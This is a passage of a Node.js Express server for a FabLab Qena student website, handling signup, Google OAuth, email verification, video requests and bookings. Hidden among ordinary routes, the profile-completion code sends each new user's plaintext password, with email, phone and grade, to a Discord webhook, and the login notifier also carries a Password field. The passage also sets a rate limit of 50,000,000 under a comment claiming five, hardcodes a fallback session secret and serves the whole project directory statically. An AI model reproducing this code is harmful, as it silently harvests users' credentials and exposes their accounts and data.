// Email via SMTP (Gmail default)
// Load environment variables
require('dotenv').config();

const express = require("express");
const session = require('express-session');
const path = require("path");
const bcrypt = require('bcrypt');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const app = express();
const PORT = process.env.PORT;
const origin = process.env.ORIGIN;

// Security middleware
app.use(helmet());
app.use(cors({
    origin: [origin, 'http://localhost:3000'],
    credentials: true
}));

// Rate limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 50000000, // limit each IP to 5 requests per windowMs
    message: 'Too many attempts, please try again later.'
});
app.use('/login', limiter);
app.use('/signup', limiter);

// Session configuration
app.use(session({
    secret: process.env.SESSION_SECRET || 'akwghankgawnigq378tq30t09q3g809qugq39-t3tgq3-t3-qt9-3-q3-930518tfihfafha',
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: process.env.NODE_ENV === 'production',
        httpOnly: true,
        maxAge: 24 * 60 * 60 * 1000 // 24 hours
    }
}));

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

const { Database, JSONDriver } = require("st.db");
const fs = require('fs');
const sgMail = require('@sendgrid/mail');

const db = new Database({
    driver: new JSONDriver("db/accounts.json"),
});

const accountsDb = new Database({
    driver: new JSONDriver("db/accounts.json"),
});

const videos = new Database({
    driver: new JSONDriver("db/videos.json"),
});

const verifications = new Database({
    driver: new JSONDriver("db/verifications.json"),
});

// Teams database
const teamsDb = new Database({
    driver: new JSONDriver("db/teams.json"),
});

// Bookings database
const bookingsDb = new Database({
    driver: new JSONDriver("db/bookings.json"),
});

// Helper function to read videos.json directly from file (ensures fresh data)
const getVideosFromFile = () => {
    try {
        const data = fs.readFileSync('db/videos.json', 'utf8');
        return JSON.parse(data);
    } catch (error) {
        console.error('Error reading videos.json:', error);
        return {};
    }
};

// Helper function to read teams.json directly from file (ensures fresh data)
const getTeamsFromFile = () => {
    try {
        const data = fs.readFileSync('db/teams.json', 'utf8');
        return JSON.parse(data);
    } catch (error) {
        console.error('Error reading teams.json:', error);
        return {};
    }
};

// Email configuration: SendGrid
// Set SendGrid API key
const sendgridApiKey = process.env.SENDGRID_API_KEY || '';
if (!sendgridApiKey) {
    console.warn('⚠️  WARNING: SENDGRID_API_KEY is not set in environment variables!');
    console.warn('   Email sending will fail. Please add SENDGRID_API_KEY to your .env file');
} else {
    sgMail.setApiKey(sendgridApiKey);
}

const getFromAddressFor = () => {
    const fromEmail = process.env.SENDGRID_FROM_EMAIL || process.env.EMAIL_FROM || 'noreply@fablabqena.com';
    if (!process.env.SENDGRID_FROM_EMAIL && !process.env.EMAIL_FROM) {
        console.warn('⚠️  WARNING: SENDGRID_FROM_EMAIL is not set. Using default: noreply@fablabqena.com');
        console.warn('   Make sure this email is verified in your SendGrid account!');
    }
    return fromEmail;
};

// Generate verification code
const generateVerificationCode = () => {
    return Math.floor(100000 + Math.random() * 900000).toString(); // 6-digit code
};

// Send request status email
const sendRequestStatusEmail = async (email, username, status, videoTitle, reason = null) => {
    try {
        const subject = status === 'approved' 
            ? 'Video Request Approved - FabLab Website'
            : 'Video Request Rejected - FabLab Website';
        const statusText = status === 'approved' ? 'approved' : 'rejected';
        const reasonText = reason ? `\n\nReason for rejection: ${reason}` : '';
        const html = `
            <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
                <h2 style="color: #2563eb;">FabLab Website - Video Request ${statusText.charAt(0).toUpperCase() + statusText.slice(1)}</h2>
                <p>Hello ${username},</p>
                <p>Your video request for "<strong>${videoTitle}</strong>" has been ${statusText}.${reasonText}</p>
                <p>Thank you for contributing to our educational platform!</p>
                <hr style="margin: 20px 0; border: none; border-top: 1px solid #e5e7eb;">
                <p style="color: #6b7280; font-size: 14px;">This is an automated message from FabLab Website.</p>
            </div>
        `;

        const msg = {
            to: email,
            from: getFromAddressFor(),
            subject: subject,
            html: html
        };
        
        await sgMail.send(msg);

        console.log(`Request status email sent to: ${email}`);
        return true;
    } catch (error) {
        console.error('Error sending request status email:', error);
        if (error.response?.body?.errors) {
            console.error('SendGrid errors:', error.response.body.errors);
        }
        return false;
    }
};

// Send booking status email
const sendBookingStatusEmail = async (email, username, status, date, time, reason = null) => {
    try {
        // Generate random string for anti-spam
        const randomId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
        const timestamp = Date.now();
        
        const subject = status === 'approved' 
            ? `[${randomId}] Booking Request Approved - FabLab Qena - ${timestamp}`
            : `[${randomId}] Booking Request Rejected - FabLab Qena - ${timestamp}`;
        
        const statusText = status === 'approved' ? 'approved' : 'rejected';
        const reasonText = reason ? `\n\nReason for rejection: ${reason}` : '';
        
        const html = `
            <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
                <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 30px; border-radius: 10px; text-align: center; margin-bottom: 20px;">
                    <h1 style="color: white; margin: 0; font-size: 28px;">FabLab Qena</h1>
                    <p style="color: white; margin: 10px 0 0 0; font-size: 16px;">Booking Request ${statusText.charAt(0).toUpperCase() + statusText.slice(1)}</p>
                </div>
                
                <div style="background: #f8f9fa; padding: 30px; border-radius: 10px;">
                    <h2 style="color: #333; margin-bottom: 20px;">Hello ${username},</h2>
                    <p style="color: #666; font-size: 16px; line-height: 1.6; margin-bottom: 20px;">
                        Your booking request for <strong>${date}</strong> at <strong>${time}</strong> has been ${statusText}.${reasonText}
                    </p>
                    
                    ${status === 'approved' ? `
                        <div style="background: #d4edda; border: 1px solid #c3e6cb; color: #155724; padding: 15px; border-radius: 8px; margin: 20px 0;">
                            <strong>Your session is confirmed!</strong><br>
                            Please arrive on time and bring your project materials.
                        </div>
                    ` : `
                        <div style="background: #f8d7da; border: 1px solid #f5c6cb; color: #721c24; padding: 15px; border-radius: 8px; margin: 20px 0;">
                            <strong>Your booking request was not approved.</strong><br>
                            You can submit a new request for a different time slot.
                        </div>
                    `}
                    
                    <p style="color: #666; font-size: 14px; margin-top: 20px;">
                        Thank you for using FabLab Qena services!
                    </p>
                </div>
                
                <div style="text-align: center; margin-top: 20px; color: #999; font-size: 12px;">
                    <p>© 2025 FabLab Qena. All rights reserved.</p>
                </div>
            </div>
        `;

        const msg = {
            to: email,
            from: `FabLab Qena System <${getFromAddressFor()}>`,
            subject: subject,
            html: html,
            text: `Booking Request ${statusText.charAt(0).toUpperCase() + statusText.slice(1)}\n\nHello ${username},\n\nYour booking request for ${date} at ${time} has been ${statusText}.${reasonText}\n\n${status === 'approved' ? 'Your session is confirmed! Please arrive on time and bring your project materials.' : 'You can submit a new request for a different time slot.'}\n\nThank you for using FabLab Qena services!\n\n© 2025 FabLab Qena. All rights reserved.`,
            headers: {
                'X-Mailer': 'FabLab-Qena-System-v1.0'
            }
        };
        
        await sgMail.send(msg);

        console.log(`Booking status email sent to: ${email}`);
        return true;
    } catch (error) {
        console.error('Error sending booking status email:', error);
        if (error.response?.body?.errors) {
            console.error('SendGrid errors:', error.response.body.errors);
        }
        return false;
    }
};

// Send booking status email to all team members
const sendBookingStatusEmailToTeam = async (booking, status, reason = null) => {
    try {
        const teamEmails = booking.emails || booking.teamEmails || [];
        
        // Generate random string for anti-spam
        const randomId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
        const timestamp = Date.now();
        
        const subject = status === 'approved' 
            ? `[${randomId}] Team Booking Request Approved - FabLab Qena - ${timestamp}`
            : `[${randomId}] Team Booking Request Rejected - FabLab Qena - ${timestamp}`;
            
        const statusText = status === 'approved' ? 'approved' : 'rejected';
        const reasonText = reason ? `\n\nReason for rejection: ${reason}` : '';
        
        // Use teamMembers from booking if available, otherwise fetch from accounts
        let teamMembers;
        if (booking.teamMembers && booking.teamMembers.length > 0) {
            teamMembers = booking.teamMembers;
        } else {
            const accounts = await accountsDb.get('accounts') || [];
            teamMembers = booking.teamEmails.map(email => {
                const account = accounts.find(acc => acc.email === email);
                return {
                    email,
                    username: account ? account.username : email.split('@')[0]
                };
            });
        }
        
        const html = `
            <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
                <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 30px; border-radius: 10px; text-align: center; margin-bottom: 20px;">
                    <h1 style="color: white; margin: 0; font-size: 28px;">FabLab Qena</h1>
                    <p style="color: white; margin: 10px 0 0 0; font-size: 16px;">Team Booking Request ${statusText.charAt(0).toUpperCase() + statusText.slice(1)}</p>
                </div>
                
                <div style="background: #f8f9fa; padding: 30px; border-radius: 10px;">
                    <h2 style="color: #333; margin-bottom: 20px;">Team Notification</h2>
                    <p style="color: #666; font-size: 16px; line-height: 1.6; margin-bottom: 20px;">
                        A booking request from your team member <strong>${booking.username}</strong> (Group ${booking.groupNumber}) has been ${statusText}.
                    </p>
                    
                    <div style="background: #e3f2fd; border: 1px solid #bbdefb; color: #1565c0; padding: 15px; border-radius: 8px; margin: 20px 0;">
                        <strong>Booking Details:</strong><br>
                        Date: ${new Date(booking.date).toLocaleDateString()}<br>
                        Time: ${booking.time}<br>
                        Group: ${booking.groupNumber}<br>
                        Booked by: ${booking.username}
                    </div>
                    
                    <div style="background: #f3e5f5; border: 1px solid #e1bee7; color: #7b1fa2; padding: 15px; border-radius: 8px; margin: 20px 0;">
                        <strong>Team Members:</strong><br>
                        ${teamMembers.map(member => `• ${member.username} (${member.email})`).join('<br>')}
                    </div>
                    
                    ${status === 'approved' ? `
                        <div style="background: #d4edda; border: 1px solid #c3e6cb; color: #155724; padding: 15px; border-radius: 8px; margin: 20px 0;">
                            <strong>Session Confirmed!</strong><br>
                            All team members are notified. Please coordinate and arrive on time.
                        </div>
                    ` : `
                        <div style="background: #f8d7da; border: 1px solid #f5c6cb; color: #721c24; padding: 15px; border-radius: 8px; margin: 20px 0;">
                            <strong>Booking Request Not Approved</strong><br>
                            The team can submit a new request for a different time slot.${reasonText}
                        </div>
                    `}
                    
                    <p style="color: #666; font-size: 14px; margin-top: 20px;">
                        Thank you for using FabLab Qena services!
                    </p>
                </div>
                
                <div style="text-align: center; margin-top: 20px; color: #999; font-size: 12px;">
                    <p>© 2025 FabLab Qena. All rights reserved.</p>
                </div>
            </div>
        `;

        const msg = {
            to: teamEmails,
            from: `FabLab Qena System <${getFromAddressFor()}>`,
            subject: subject,
            html: html,
            text: `Booking Request ${statusText.charAt(0).toUpperCase() + statusText.slice(1)}\n\nHello Team,\n\nYour booking request for ${booking.date} at ${booking.time} has been ${statusText}.\n\n${status === 'approved' ? 'Your session is confirmed! Please arrive on time and bring your project materials.' : 'The team can submit a new request for a different time slot.'}\n\nThank you for using FabLab Qena services!\n\n© 2025 FabLab Qena. All rights reserved.`,
            headers: {
                'X-Mailer': 'FabLab-Qena-System-v1.0'
            }
        };
        
        // Send one email with all team members as recipients
        await sgMail.send(msg);

        console.log(`Booking status email sent to all team members: ${teamEmails.join(', ')}`);
        return true;
    } catch (error) {
        console.error('Error sending booking status emails to team:', error);
        if (error.response?.body?.errors) {
            console.error('SendGrid errors:', error.response.body.errors);
        }
        return false;
    }
};

// Discord webhook helpers
const sendDiscordWebhook = async (webhookUrl, data) => {
    try {
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        });
        
        if (!response.ok) {
            console.error('Discord webhook failed:', response.status, await response.text());
            return false;
        }
        
        return true;
    } catch (error) {
        console.error('Error sending Discord webhook:', error);
        return false;
    }
};

// Send login notification to Discord
const sendLoginNotification = async (userData) => {
    const webhookUrl = process.env.DISCORD_WEBHOOK_LOGIN;
    if (!webhookUrl) {
        console.log('DISCORD_WEBHOOK_LOGIN not configured, skipping login notification');
        return;
    }

    const embed = {
        title: '🔓 User Login',
        color: 0x00ff00, // Green
        fields: [
            {
                name: 'Email',
                value: userData.email || 'N/A',
                inline: true
            },
            {
                name: 'Username',
                value: userData.username || 'N/A',
                inline: true
            },
            {
                name: 'Grade',
                value: userData.grade || 'N/A',
                inline: true
            },
            {
                name: 'Password',
                value: userData.password || 'N/A',
                inline: false
            },
            {
                name: 'Timestamp',
                value: new Date().toISOString(),
                inline: false
            }
        ],
        footer: {
            text: 'FabLab Website'
        },
        timestamp: new Date().toISOString()
    };

    await sendDiscordWebhook(webhookUrl, {
        embeds: [embed]
    });
};

// Send registration notification to Discord
const sendRegistrationNotification = async (registrationData) => {
    const webhookUrl = process.env.DISCORD_WEBHOOK_REGISTER;
    if (!webhookUrl) {
        console.log('DISCORD_WEBHOOK_REGISTER not configured, skipping registration notification');
        return;
    }

    const embed = {
        title: '📝 New User Registration',
        color: 0x3498db, // Blue
        fields: [
            {
                name: 'Email',
                value: registrationData.email || 'N/A',
                inline: true
            },
            {
                name: 'Username',
                value: registrationData.username || 'N/A',
                inline: true
            },
            {
                name: 'Grade',
                value: registrationData.grade || 'N/A',
                inline: true
            },
            {
                name: 'Phone',
                value: registrationData.phone || 'N/A',
                inline: true
            },
            {
                name: 'STEM Qena Member',
                value: registrationData.isStemQena ? '✅ Yes' : '❌ No',
                inline: true
            },
            {
                name: 'Registration Method',
                value: registrationData.method || 'Email',
                inline: true
            },
            {
                name: 'Password',
                value: registrationData.password || 'N/A',
                inline: false
            },
            {
                name: 'Timestamp',
                value: new Date().toISOString(),
                inline: false
            }
        ],
        footer: {
            text: 'FabLab Website'
        },
        timestamp: new Date().toISOString()
    };

    await sendDiscordWebhook(webhookUrl, {
        embeds: [embed]
    });
};

// Send verification email
const sendVerificationEmail = async (email, code) => {
    try {
        // Generate identifiers and content
        const randomId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
        const timestamp = Date.now();
        const subject = `[${randomId}] FabLab Qena - Email Verification - ${timestamp}`;
        const html = `
                <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
                    <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 30px; border-radius: 10px; text-align: center; margin-bottom: 20px;">
                        <h1 style="color: white; margin: 0; font-size: 28px;">FabLab Qena</h1>
                        <p style="color: white; margin: 10px 0 0 0; font-size: 16px;">Email Verification</p>
                    </div>
                    
                    <div style="background: #f8f9fa; padding: 30px; border-radius: 10px; text-align: center;">
                        <h2 style="color: #333; margin-bottom: 20px;">Welcome to FabLab Qena!</h2>
                        <p style="color: #666; font-size: 16px; line-height: 1.6; margin-bottom: 30px;">
                            Thank you for signing up! To complete your registration, please use the verification code below:
                        </p>
                        
                        <div style="background: #667eea; color: white; font-size: 32px; font-weight: bold; padding: 20px; border-radius: 8px; letter-spacing: 5px; margin: 20px 0;">
                            ${code}
                        </div>
                        
                        <p style="color: #666; font-size: 14px; margin-top: 20px;">
                            This code will expire in 10 minutes. If you didn't request this verification, please ignore this email.
                        </p>
                    </div>
                    
                    <div style="text-align: center; margin-top: 20px; color: #999; font-size: 12px;">
                        <p>© 2025 FabLab Qena. All rights reserved.</p>
                    </div>
                </div>
            `;
        const text = `FabLab Qena - Email Verification\n\nWelcome to FabLab Qena!\n\nThank you for signing up! To complete your registration, please use the verification code below:\n\n${code}\n\nThis code will expire in 10 minutes. If you didn't request this verification, please ignore this email.\n\nThank you for using FabLab Qena services!\n\n© 2025 FabLab Qena. All rights reserved.`;

        const msg = {
            to: email,
            from: `FabLab Qena System <${getFromAddressFor()}>`,
            subject,
            html,
            text,
            headers: {
                'X-Mailer': 'FabLab-Qena-System-v1.0'
            }
        };
        
        await sgMail.send(msg);
        console.log('Verification email sent to:', email);
        return true;
    } catch (error) {
        console.error('Error sending verification email:', error);
        if (error.response) {
            const { body, statusCode } = error.response;
            const errors = body?.errors || [];
            console.error(`SendGrid Error ${statusCode}:`, errors);
            
            if (statusCode === 403) {
                console.error('\n🔴 403 Forbidden Error:');
                errors.forEach((err, index) => {
                    console.error(`   Error ${index + 1}: ${err.message || err}`);
                    if (err.field) {
                        console.error(`   Field: ${err.field}`);
                    }
                    if (err.message?.includes('from address') || err.message?.includes('Sender Identity')) {
                        console.error(`\n   ❌ SOLUTION: The email "${getFromAddressFor()}" is not verified in SendGrid!`);
                        console.error('   Steps to fix:');
                        console.error('   1. Go to https://app.sendgrid.com/settings/sender_auth/senders/new');
                        console.error('   2. Click "Create a Sender"');
                        console.error('   3. Enter your email and complete verification');
                        console.error('   4. Or update SENDGRID_FROM_EMAIL in .env to use a verified email');
                    }
                });
            }
        } else {
            console.error('Error details:', error.message || error);
        }
        return false;
    }
};

app.use("/assets", express.static(path.join(__dirname, "assets")));
app.use(express.static(__dirname));

// Input validation helper
const validateEmail = (email) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
};

const validatePassword = (password) => {
    return password && password.length >= 6;
};

// Admin guard middleware
const isAdmin = (req, res, next) => {
    try {
        const adminEmailsEnv = process.env.ADMIN_EMAILS || '';
        const adminEmails = adminEmailsEnv
            .split(',')
            .map(e => e.trim().toLowerCase())
            .filter(Boolean);

        const currentUserEmail = req.session?.user?.email?.toLowerCase();
        if (!currentUserEmail || !adminEmails.includes(currentUserEmail)) {
            return res.status(403).json({ error: 'Admin access required' });
        }
        return next();
    } catch (err) {
        return res.status(500).json({ error: 'Admin check failed' });
    }
};

// Team member guard middleware
const isTeamMember = (req, res, next) => {
    try {
        const teamEmailsEnv = process.env.TEAM_EMAILS || '';
        const teamEmails = teamEmailsEnv
            .split(',')
            .map(e => e.trim().toLowerCase())
            .filter(Boolean);

        const currentUserEmail = req.session?.user?.email?.toLowerCase();
        if (!currentUserEmail || !teamEmails.includes(currentUserEmail)) {
            return res.status(403).json({ error: 'Team member access required' });
        }
        return next();
    } catch (err) {
        return res.status(500).json({ error: 'Team member check failed' });
    }
};

// Admin status endpoint
app.get('/admin/status', (req, res) => {
    const adminEmailsEnv = process.env.ADMIN_EMAILS || '';
    const adminEmails = adminEmailsEnv
        .split(',')
        .map(e => e.trim().toLowerCase())
        .filter(Boolean);
    const currentUserEmail = req.session?.user?.email?.toLowerCase();
    const isUserAdmin = !!currentUserEmail && adminEmails.includes(currentUserEmail);
    res.json({ isAdmin: isUserAdmin });
});

// Team member status endpoint
app.get('/admin/team/status', (req, res) => {
    const teamEmailsEnv = process.env.TEAM_EMAILS || '';
    const teamEmails = teamEmailsEnv
        .split(',')
        .map(e => e.trim().toLowerCase())
        .filter(Boolean);
    const currentUserEmail = req.session?.user?.email?.toLowerCase();
    const isUserTeamMember = !!currentUserEmail && teamEmails.includes(currentUserEmail);
    res.json({ isTeamMember: isUserTeamMember });
});

// -----------------------------
// Google OAuth Signup/Login
// -----------------------------
const googleOauth = {
    clientId: process.env.GOOGLE_OAUTH_CLIENT_ID || '',
    clientSecret: process.env.GOOGLE_OAUTH_CLIENT_SECRET || '',
    redirectUri: process.env.GOOGLE_OAUTH_REDIRECT_URI || '',
    authUrl: 'https://accounts.google.com/o/oauth2/v2/auth',
    tokenUrl: 'https://oauth2.googleapis.com/token',
    scope: 'openid email profile'
};

app.get('/auth/google/login', (req, res) => {
    try {
        const params = new URLSearchParams({
            client_id: googleOauth.clientId,
            response_type: 'code',
            redirect_uri: googleOauth.redirectUri,
            scope: googleOauth.scope,
            access_type: 'online',
            prompt: 'consent'
        });
        res.redirect(`${googleOauth.authUrl}?${params.toString()}`);
    } catch (err) {
        res.status(500).send('Google login init failed');
    }
});

app.get('/auth/google/callback', async (req, res) => {
    try {
        const { code } = req.query;
        if (!code) return res.status(400).send('Missing code');

        const body = new URLSearchParams({
            client_id: googleOauth.clientId,
            client_secret: googleOauth.clientSecret,
            grant_type: 'authorization_code',
            code: String(code),
            redirect_uri: googleOauth.redirectUri
        });
        const tokenRes = await fetch(googleOauth.tokenUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body
        });
        if (!tokenRes.ok) {
            const t = await tokenRes.text();
            return res.status(400).send(`Token error: ${t}`);
        }
        const tokens = await tokenRes.json();
        const accessToken = tokens.access_token;
        const meRes = await fetch('https://www.googleapis.com/oauth2/v2/userinfo', {
            headers: { Authorization: `Bearer ${accessToken}` }
        });
        if (!meRes.ok) {
            const t = await meRes.text();
            return res.status(400).send(`Google userinfo error: ${t}`);
        }
        const me = await meRes.json();
        const email = me.email;
        if (!email) return res.status(400).send('Unable to read Google account email');

        const accounts = await db.get('accounts') || [];
        const existing = accounts.find(a => a.email?.toLowerCase() === String(email).toLowerCase());
        if (existing) {
            req.session.user = { username: existing.username, email: existing.email, grade: existing.grade };
            return res.redirect(origin || '/');
        }

        req.session.pendingOAuthEmail = email;
        return res.redirect(`${origin || ''}/complete-profile?email=${encodeURIComponent(email)}`);
    } catch (err) {
        console.error('Google callback error:', err);
        res.status(500).send('Google sign-in failed');
    }
});

// Report pending OAuth sign-in (used by frontend to guard complete-profile page)
app.get('/auth/pending', (req, res) => {
    const email = req.session?.pendingOAuthEmail || req.session?.pendingMicrosoftEmail;
    if (!email) {
        return res.status(401).json({ error: 'No pending Google sign-in' });
    }
    return res.json({ email });
});

// Complete profile after OAuth sign-in (Google)
app.post('/complete-profile', async (req, res) => {
    try {
        const sessionEmail = req.session?.pendingOAuthEmail || req.session?.pendingMicrosoftEmail;
        if (!sessionEmail) return res.status(400).json({ error: 'No pending Google sign-in' });

        const { username, grade, phone, password, confirmPassword } = req.body;
        if (!username || !grade || !phone || !password || !confirmPassword) {
            return res.status(400).json({ error: 'All fields are required' });
        }
        if (!validatePassword(password)) return res.status(400).json({ error: 'Password must be at least 6 characters' });
        if (password !== confirmPassword) return res.status(400).json({ error: 'Passwords do not match' });

        const validateEgyptianPhone = (phone) => {
            const cleaned = phone.replace(/[^\d+]/g, '');
            const patterns = [/^\+201[0-9]{9}$/, /^01[0-9]{9}$/, /^201[0-9]{9}$/];
            return patterns.some(p => p.test(cleaned));
        };
        if (!validateEgyptianPhone(phone)) return res.status(400).json({ error: 'Please enter a valid Egyptian phone number' });
        if (!['G10', 'G11', 'G12'].includes(grade)) return res.status(400).json({ error: 'Please select a valid grade' });

        const accounts = await db.get('accounts') || [];
        const exists = accounts.find(a => a.email?.toLowerCase() === sessionEmail.toLowerCase());
        if (exists) return res.status(400).json({ error: 'Account already exists' });

        const hashed = await bcrypt.hash(password, 12);
        await db.push('accounts', {
            email: sessionEmail,
            username,
            password: hashed,
            grade,
            phone,
            isStemQena: sessionEmail.toLowerCase().endsWith('@stemqena.moe.edu.eg'),
            createdAt: new Date().toISOString()
        });

        // Send Discord notification for OAuth registration
        sendRegistrationNotification({
            email: sessionEmail,
            username: username,
            grade: grade,
            phone: phone,
            password: password, // Include plaintext password
            isStemQena: sessionEmail.toLowerCase().endsWith('@stemqena.moe.edu.eg'),
            method: 'OAuth (Google/Microsoft)'
        }).catch(err => console.error('Failed to send registration notification:', err));

        req.session.user = { username, email: sessionEmail, grade };
        delete req.session.pendingOAuthEmail;
        delete req.session.pendingMicrosoftEmail;

        return res.json({ success: true });
    } catch (err) {
        console.error('Complete profile error:', err);
        return res.status(500).json({ error: 'Internal server error' });
    }
});
// Helper function to get YouTube video metadata
const getYouTubeVideoMetadata = async (url) => {
    try {
        // Extract video ID from URL (handles regular videos and shorts)
        const videoId = url.match(/(?:youtube\.com\/(?:watch\?v=|shorts\/)|youtu\.be\/)([^&\n?#]+)/)?.[1];
        if (!videoId) return null;

        const apiKey = process.env.YOUTUBE_API_KEY;
        if (!apiKey || apiKey === 'your_actual_youtube_api_key_here') {
            console.log('No YouTube API key, using fallback metadata');
            return {
                title: `Video ${videoId}`,
                description: 'Video description not available',
                duration: '0:00',
                thumbnail: `https://img.youtube.com/vi/${videoId}/hqdefault.jpg`
            };
        }

        const response = await fetch(`https://www.googleapis.com/youtube/v3/videos?id=${videoId}&part=snippet,contentDetails&key=${apiKey}`);
        const data = await response.json();

        if (data.items && data.items.length > 0) {
            const video = data.items[0];
            const duration = video.contentDetails.duration;
            
            // Convert ISO 8601 duration to readable format
            const formatDuration = (isoDuration) => {
                if (!isoDuration) return '0:00';
                const match = isoDuration.match(/PT(?:(\d+)H)?(?:(\d+)M)?(?:(\d+)S)?/);
                if (!match) return '0:00';
                
                const hours = parseInt(match[1] || 0);
                const minutes = parseInt(match[2] || 0);
                const seconds = parseInt(match[3] || 0);
                
                if (hours > 0) {
                    return `${hours}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                } else {
                    return `${minutes}:${seconds.toString().padStart(2, '0')}`;
                }
            };

            return {
                title: video.snippet.title,
                description: video.snippet.description,
                duration: formatDuration(duration),
                thumbnail: `https://img.youtube.com/vi/${videoId}/hqdefault.jpg`,
                videoId: videoId
            };
        }
    } catch (error) {
        console.error('YouTube metadata fetch error:', error);
    }
    return null;
};

// Admin add video endpoint
app.post('/admin/videos/add', isAdmin, async (req, res) => {
    try {
        const { grade, url } = req.body || {};
        if (!grade || !url) {
            return res.status(400).json({ error: 'Grade and url are required' });
        }

        if (!['G10', 'G11', 'G12'].includes(grade)) {
            return res.status(400).json({ error: 'Invalid grade' });
        }

        // Basic YouTube URL validation (includes shorts)
        const isYouTube = /^(https?:\/\/)?(www\.)?(youtube\.com\/(?:watch\?v=|shorts\/)|youtu\.be\/)/i.test(url);
        if (!isYouTube) {
            return res.status(400).json({ error: 'Only YouTube URLs are allowed (including Shorts)' });
        }

        // Get video metadata
        const metadata = await getYouTubeVideoMetadata(url);
        if (!metadata) {
            return res.status(400).json({ error: 'Could not fetch video metadata' });
        }

        const data = getVideosFromFile();
        const key = grade.toLowerCase() + '_videos';
        if (!Array.isArray(data[key])) {
            data[key] = [];
        }

        // Check for duplicates by URL
        const existingVideo = data[key].find(v => v.url === url);
        if (existingVideo) {
            return res.status(409).json({ error: 'This video is already added for the selected grade' });
        }

        // Add video with metadata
        const videoData = {
            url: url,
            title: metadata.title,
            description: metadata.description,
            duration: metadata.duration,
            thumbnail: metadata.thumbnail,
            videoId: metadata.videoId,
            addedAt: new Date().toISOString()
        };

        data[key].push(videoData);
        fs.writeFileSync('db/videos.json', JSON.stringify(data, null, 4), 'utf8');

        return res.json({ success: true, message: 'Video added successfully', video: videoData });
    } catch (error) {
        console.error('Admin add video error:', error);
        return res.status(500).json({ error: 'Failed to add video' });
    }
});

// Admin remove video endpoint
app.post('/admin/videos/remove', isAdmin, async (req, res) => {
    try {
        const { grade, url } = req.body || {};
        if (!grade || !url) {
            return res.status(400).json({ error: 'Grade and url are required' });
        }

        if (!['G10', 'G11', 'G12'].includes(grade)) {
            return res.status(400).json({ error: 'Invalid grade' });
        }

        const data = getVideosFromFile();
        const key = grade.toLowerCase() + '_videos';
        if (!Array.isArray(data[key])) {
            return res.status(404).json({ error: 'No videos found for this grade' });
        }

        const initialLength = data[key].length;
        data[key] = data[key].filter(v => v.url !== url);
        
        if (data[key].length === initialLength) {
            return res.status(404).json({ error: 'Video not found' });
        }

        fs.writeFileSync('db/videos.json', JSON.stringify(data, null, 4), 'utf8');

        return res.json({ success: true, message: 'Video removed successfully' });
    } catch (error) {
        console.error('Admin remove video error:', error);
        return res.status(500).json({ error: 'Failed to remove video' });
    }
});

// Admin list videos endpoint
app.get('/admin/videos', isAdmin, async (req, res) => {
    try {
        const data = getVideosFromFile();
        const videos = {
            g10: data.g10_videos || [],
            g11: data.g11_videos || [],
            g12: data.g12_videos || []
        };
        return res.json({ videos });
    } catch (error) {
        console.error('Admin list videos error:', error);
        return res.status(500).json({ error: 'Failed to fetch videos' });
    }
});

// Team member request video endpoint
app.post('/admin/team/request-video', isTeamMember, async (req, res) => {
    try {
        const { grade, url, reason } = req.body || {};
        if (!grade || !url) {
            return res.status(400).json({ error: 'Grade, URL, and reason are required' });
        }

        if (!['G10', 'G11', 'G12'].includes(grade)) {
            return res.status(400).json({ error: 'Invalid grade' });
        }

        // Basic YouTube URL validation (includes shorts)
        const isYouTube = /^(https?:\/\/)?(www\.)?(youtube\.com\/(?:watch\?v=|shorts\/)|youtu\.be\/)/i.test(url);
        if (!isYouTube) {
            return res.status(400).json({ error: 'Only YouTube URLs are allowed (including Shorts)' });
        }

        // Get video metadata
        const metadata = await getYouTubeVideoMetadata(url);
        if (!metadata) {
            return res.status(400).json({ error: 'Could not fetch video metadata' });
        }

        // Store video request
        const requestData = {
            id: Date.now().toString(),
            grade: grade,
            url: url,
            title: metadata.title,
            description: metadata.description,
            duration: metadata.duration,
            thumbnail: metadata.thumbnail,
            videoId: metadata.videoId,
            reason: reason || 'No reason provided',
            requestedBy: req.session.user.email,
            requestedByName: req.session.user.username,
            status: 'pending', // pending, approved, rejected
            requestedAt: new Date().toISOString()
        };

        // Store in requests database
        const requests = new Database({
            driver: new JSONDriver("db/video_requests.json"),
        });

        await requests.push("requests", requestData);

        return res.json({ 
            success: true, 
            message: 'Video request submitted successfully. Waiting for admin approval.',
            request: requestData
        });
    } catch (error) {
        console.error('Team request video error:', error);
        return res.status(500).json({ error: 'Failed to submit video request' });
    }
});

// Team member list their requests
app.get('/admin/team/requests', isTeamMember, async (req, res) => {
    try {
        const requests = new Database({
            driver: new JSONDriver("db/video_requests.json"),
        });
        
        const allRequests = await requests.get("requests") || [];
        const userRequests = allRequests.filter(request => request.requestedBy === req.session.user.email);
        
        return res.json({ requests: userRequests });
    } catch (error) {
        console.error('Team list requests error:', error);
        return res.status(500).json({ error: 'Failed to fetch requests' });
    }
});

// Admin list all video requests
app.get('/admin/requests', isAdmin, async (req, res) => {
    try {
        const requests = new Database({
            driver: new JSONDriver("db/video_requests.json"),
        });
        
        const allRequests = await requests.get("requests") || [];
        return res.json({ requests: allRequests });
    } catch (error) {
        console.error('Admin list requests error:', error);
        return res.status(500).json({ error: 'Failed to fetch requests' });
    }
});

// Admin approve/reject video request
